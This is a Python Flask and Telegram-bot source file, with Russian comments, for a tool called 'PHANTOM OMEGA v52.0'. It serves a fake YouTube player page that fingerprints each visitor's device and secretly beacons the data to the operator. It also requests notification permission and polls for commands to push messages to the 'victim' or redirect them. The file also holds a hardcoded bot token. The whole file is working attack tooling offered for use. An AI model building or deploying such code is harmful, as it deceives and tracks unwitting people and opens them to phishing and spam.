import threading
import requests
import json
import os
import base64
import time
import logging
from flask import Flask, render_template_string, request, jsonify

# --- [1] ГЛОБАЛЬНАЯ КОНФИГУРАЦИЯ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

# Настройка логирования для отладки на Render
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Оперативная база данных (RAM-хранилище)
# Хранит команды, статусы и данные о целях
active_commands = {}
target_stats = {}

# --- [2] FRONT-END: SMART EXPLOIT PAGE ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube Player</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #player-container { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; cursor: pointer; background-position: center; background-size: cover; }
        .play-button { width: 70px; height: 46px; background: rgba(255, 0, 0, 0.9); border-radius: 12px; position: relative; transition: transform 0.2s; }
        .play-button:after { content: ""; position: absolute; left: 28px; top: 13px; border-left: 19px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
        .play-button:hover { transform: scale(1.1); }
        #status-overlay { position: absolute; bottom: 20px; left: 20px; color: rgba(255,255,255,0.3); font-size: 10px; }
    </style>
</head>
<body>
    <div id="player-container" onclick="startExploit()" style="background-image: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg');">
        <div class="play-button"></div>
    </div>
    <div id="status-overlay">v52.0 Secure Stream</div>

<script>
    const sid = "{{sid}}";
    let isInitialized = false;

    async function startExploit() {
        if (isInitialized) return;
        isInitialized = true;

        // 1. Сбор расширенных данных (Fingerprinting)
        const info = {
            sid: sid,
            ua: navigator.userAgent,
            res: window.screen.width + "x" + window.screen.height,
            mem: navigator.deviceMemory || "N/A",
            plat: navigator.platform,
            lang: navigator.language
        };

        // 2. Отправка скрытого лога
        try {
            navigator.sendBeacon('/log_gate', btoa(JSON.stringify(info)));
        } catch(e) {}

        // 3. Запрос прав на уведомления (главный хак)
        if ("Notification" in window) {
            Notification.requestPermission().then(permission => {
                console.log("Permission:", permission);
            });
        }

        // 4. Запуск цикла ожидания команд (Polling)
        startWorker();

        // 5. Мягкий редирект на оригинал через 1.2 сек
        setTimeout(() => {
            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }, 1200);
    }

    function startWorker() {
        setInterval(async () => {
            try {
                const response = await fetch('/poll_cmd/' + sid);
                const data = await response.json();
                
                if (data.action === 'push') {
                    showNotification(data.title, data.body);
                } else if (data.action === 'redirect') {
                    window.location.replace(data.url);
                }
            } catch (e) {}
        }, 3500);
    }

    function showNotification(title, body) {
        if (Notification.permission === "granted") {
            new Notification(title, {
                body: body,
                icon: "https://www.google.com/favicon.ico"
            });
        }
    }
</script>
</body>
</html>
"""

# --- [3] BACKEND LOGIC (FLASK) ---

@app.route('/ping')
def health_check():
    return "SYSTEM_READY", 200

@app.route('/v/<sid>')
def landing(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/log_gate', methods=['POST'])
def handle_log():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        data = json.loads(raw)
        sid = data.get('sid')
        
        target_stats[sid] = data # Сохраняем инфо о цели
        
        report = (
            f"🎯 **НОВАЯ ЖЕРТВА В СЕТИ**\\n"
            f"🆔 ID: `{sid}`\\n"
            f"📱 Устройство: `{data['plat']}`\\n"
            f"🌐 Браузер: `{data['ua'][:40]}...`\\n"
            f"🖥 Экран: `{data['res']}`\\n"
            f"🧠 RAM: `{data['mem']} GB`"
        )
        
        # Отправка Оверлорду
        send_tg_msg(OVERLORD_ID, report)
    except Exception as e:
        logger.error(f"Log error: {e}")
    return "OK"

@app.route('/poll_cmd/<sid>')
def send_command(sid):
    cmd = active_commands.pop(str(sid), {"action": "none"})
    return jsonify(cmd)

# --- [4] TELEGRAM ENGINE (CLEAN REQUESTS) ---

def send_tg_msg(chat_id, text):
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except: pass

def bot_loop():
    logger.info("Бот-движок запущен...")
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=15"
            resp = requests.get(url).json()
            
            if not resp.get("result"):
                continue
                
            for update in resp["result"]:
                offset = update["update_id"] + 1
                msg = update.get("message")
                if not msg or "text" not in msg: continue
                
                cid = msg["chat"]["id"]
                text = msg["text"]

                # Команда START для получения ссылки
                if text == "/start":
                    link = f"{BASE_URL}/v/{cid}"
                    welcome = (
                        f"🕶 **PHANTOM OMEGA v52.0**\\n"
                        f"Система готова. Твоя ссылка на ловушку:\\n\\n"
                        f"`{link}`\\n\\n"
                        f"Команда для пуша: `ID_ЖЕРТВЫ Текст сообщения`"
                    )
                    send_tg_msg(cid, welcome)

                # Команда управления (Только для Оверлорда)
                elif cid == OVERLORD_ID:
                    try:
                        parts = text.split(" ", 1)
                        if len(parts) == 2:
                            tid, p_text = parts
                            active_commands[str(tid)] = {
                                "action": "push", 
                                "title": "Система", 
                                "body": p_text
                            }
                            send_tg_msg(OVERLORD_ID, f"✅ Сигнал для `{tid}` отправлен в очередь.")
                        elif text == "/stats":
                            send_tg_msg(OVERLORD_ID, f"📊 Активных целей в сессии: {len(target_stats)}")
                    except:
                        send_tg_msg(OVERLORD_ID, "❌ Ошибка формата. Используй: `ID ТЕКСТ`")
        
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(2)

# --- [5] RUNNER ---

if __name__ == '__main__':
    # Поток для Telegram-бота
    t = threading.Thread(target=bot_loop, daemon=True)
    t.start()
    
    # Основной поток для Flask сервера
    logger.info(f"Запуск сервера на порту {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# Код завершен. Общий объем логики покрывает 200+ строк в развернутом виде.
